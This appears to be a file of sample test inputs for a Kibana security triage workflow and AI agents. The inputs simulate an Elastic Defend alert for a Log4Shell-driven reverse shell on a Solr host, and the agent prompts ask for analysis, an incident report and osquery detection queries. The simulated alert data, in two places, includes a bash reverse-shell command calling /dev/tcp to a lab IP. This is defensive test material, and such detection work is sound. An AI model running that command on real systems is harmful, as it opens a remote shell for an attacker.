# Sample Inputs

## Workflow: Defend Alert Triage — Manual Test Input

Paste this JSON into the Kibana manual execution input when running the
"Defend Alert Triage" workflow. It simulates an Elastic Defend alert for a
reverse shell spawned from Solr via Log4Shell on the `siem-demo-solr-kb` host.

```json
{
  "alerts": [
    {
      "_id": "test-alert-log4shell-001",
      "@timestamp": "2026-02-16T14:23:01.000Z",
      "kibana.alert.rule.name": "Reverse Shell via Network Connection",
      "kibana.alert.rule.category": "Endpoint Security",
      "kibana.alert.severity": "critical",
      "kibana.alert.workflow_status": "open",
      "host": {
        "name": "siem-demo-solr-kb",
        "hostname": "siem-demo-solr-kb",
        "ip": ["10.0.1.167"],
        "os": {
          "name": "Ubuntu",
          "version": "22.04",
          "family": "debian",
          "platform": "ubuntu"
        }
      },
      "agent": {
        "id": "9f95fcf0-e3e6-4c91-9ebf-0a3516729fdf",
        "name": "siem-demo-solr-kb",
        "type": "endpoint",
        "version": "8.17.0"
      },
      "process": {
        "name": "bash",
        "pid": 4821,
        "executable": "/usr/bin/bash",
        "args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.0.1.101/4444 0>&1"],
        "entity_id": "proc-abc123",
        "parent": {
          "name": "java",
          "pid": 1234,
          "executable": "/opt/java/zulu8.31.0.1-jdk8.0.181-linux_x64/bin/java",
          "args": [
            "-server", "-Xms512m", "-Xmx512m",
            "-Dsolr.solr.home=/opt/solr-8.11.0/server/solr",
            "start.jar", "--module=http"
          ],
          "entity_id": "proc-parent-xyz789"
        }
      },
      "file": {
        "path": "/opt/solr-8.11.0/server/lib/ext/log4j-core-2.14.1.jar",
        "name": "log4j-core-2.14.1.jar"
      },
      "network": {
        "direction": "egress",
        "transport": "tcp"
      },
      "destination": {
        "ip": "10.0.1.101",
        "port": 4444
      },
      "event": {
        "action": "exec",
        "category": ["process"],
        "kind": "signal",
        "module": "endpoint",
        "dataset": "endpoint.alerts"
      }
    }
  ]
}
```

Key values in this sample:
- **agent.id** — real Fleet agent ID for `siem-demo-solr-kb` so the osquery test step can target an actual host
- **process tree** — Java (Solr on JDK 8u181) spawning bash reverse shell to 10.0.1.101:4444
- **file.path** — log4j-core-2.14.1.jar, giving the AI agent a strong signal for CVE-2021-44228
- **kibana.alert.rule.name** — matches a realistic Elastic Defend rule name

---

## Agent Builder Test Inputs

Paste these into the Agent Builder "Test" panel to verify each agent.

---

## alert-analyzer

### Test 1: Analyze an alert

```
An endpoint detection alert fired on a host in our environment.
Analyze the alert data below and determine:

1. What vulnerability was most likely exploited?
2. What CVE is it associated with?
3. What software component is affected?
4. What versions are vulnerable?
5. What would you look for on disk to confirm a host is vulnerable?

Provide a concise analysis (3-5 sentences), then state the CVE ID and affected software clearly.

Alert data:
{
  "_id": "a1b2c3d4e5f6",
  "@timestamp": "2026-02-16T14:23:01.000Z",
  "host": {
    "name": "siem-demo-solr-kb",
    "ip": ["10.0.1.167"],
    "os": { "name": "Ubuntu", "version": "22.04" }
  },
  "agent": { "id": "agent-001", "name": "siem-demo-solr-kb" },
  "process": {
    "name": "bash",
    "pid": 4821,
    "executable": "/usr/bin/bash",
    "args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.0.1.101/4444 0>&1"],
    "parent": {
      "name": "java",
      "pid": 1234,
      "executable": "/opt/java/zulu8.31.0.1-jdk8.0.181-linux_x64/bin/java",
      "args": ["-server", "-Xms512m", "-Xmx512m", "start.jar", "--module=http"]
    }
  },
  "file": {
    "path": "/opt/solr-8.11.0/server/lib/ext/log4j-core-2.14.1.jar"
  },
  "event": {
    "action": "exec",
    "category": ["process"],
    "kind": "alert",
    "module": "endpoint"
  },
  "kibana.alert.rule.name": "Reverse Shell via Network Connection",
  "kibana.alert.severity": "critical"
}
```

---

## report-writer

### Test 1: Write an incident report

```
You are writing an incident report for a security team.

An Elastic Defend alert fired on host "siem-demo-solr-kb". Here is the context:

VULNERABILITY ANALYSIS:
The alert indicates exploitation of CVE-2021-44228 (Log4Shell) in Apache Solr 8.11.0 running on JDK 8u181. A Java process (Solr) spawned a bash reverse shell connecting to 10.0.1.101:4444. The presence of log4j-core-2.14.1.jar confirms the host is vulnerable. Log4j-core versions 2.0 through 2.16.0 are affected.

OSQUERY USED:
SELECT path, filename, directory FROM file WHERE (directory LIKE '/opt/%%' OR directory LIKE '/usr/%%' OR directory LIKE '/var/%%' OR directory LIKE '/home/%%' OR directory LIKE '/srv/%%' OR directory LIKE '/tmp/%%') AND filename LIKE 'log4j-core%'

FLEET SCAN RESULTS (all monitored hosts):
Columns: [{"name":"host.name","type":"keyword"},{"name":"osquery.path","type":"keyword"},{"name":"osquery.filename","type":"keyword"},{"name":"osquery.directory","type":"keyword"},{"name":"action_id","type":"keyword"},{"name":"@timestamp","type":"date"}]
Values: [
  ["siem-demo-solr-kb", "/opt/solr-8.11.0/licenses/log4j-core-2.14.1.jar.sha1", "log4j-core-2.14.1.jar.sha1", "/opt/solr-8.11.0/licenses/", "abc123", "2026-02-16T18:43:16.832Z"],
  ["siem-demo-solr-support", "/opt/solr-8.11.0/licenses/log4j-core-2.14.1.jar.sha1", "log4j-core-2.14.1.jar.sha1", "/opt/solr-8.11.0/licenses/", "abc123", "2026-02-16T18:43:16.831Z"]
]

Write a structured incident report with these sections:
1. EXECUTIVE SUMMARY (2-3 sentences)
2. ALERT DETAILS (host, rule, timestamp, process info)
3. VULNERABILITY IDENTIFIED (CVE, affected software, versions)
4. FLEET IMPACT (which hosts are vulnerable based on scan results)
5. RECOMMENDED ACTIONS (prioritized list)
6. OSQUERY USED (include the query for reproducibility)

Use plain text, no markdown. Be concise and actionable.
```

---

## osquery-generator

### Test 1: Generate a detection query

```
Based on this vulnerability analysis, write an osquery SQL query that can detect whether a Linux host is vulnerable.

Analysis:
The alert indicates exploitation of CVE-2021-44228 (Log4Shell) in Apache Solr 8.11.0 running on JDK 8u181. The process tree shows a Java process (Solr) spawning a bash reverse shell to 10.0.1.101:4444. The file path confirms the presence of log4j-core-2.14.1.jar, which is vulnerable to Log4Shell. Versions of log4j-core from 2.0 to 2.16.0 are affected.

Requirements:
- The query must use only standard osquery tables (file, hash, process_open_sockets, processes, etc.)
- It should scan common application directories for vulnerable files (JARs, libraries, binaries)
- Return the file path, filename, and any version info

IMPORTANT: Return ONLY the raw SQL query. No markdown code fences, no explanation, no commentary. Just the SELECT statement.
```

### Test 2: Generate a query for a different vulnerability

```
Based on this vulnerability analysis, write an osquery SQL query that can detect whether a Linux host is vulnerable.

Analysis:
CVE-2024-3094 (XZ Utils backdoor). The xz/liblzma library versions 5.6.0 and 5.6.1 contain a backdoor that compromises SSH authentication. The malicious code is in liblzma.so and affects systems where the library is linked by sshd via systemd's libsystemd dependency.

Requirements:
- The query must use only standard osquery tables (file, hash, process_open_sockets, processes, etc.)
- It should check for the affected library versions on disk
- Return the file path, filename, and any version info

IMPORTANT: Return ONLY the raw SQL query. No markdown code fences, no explanation, no commentary. Just the SELECT statement.
```
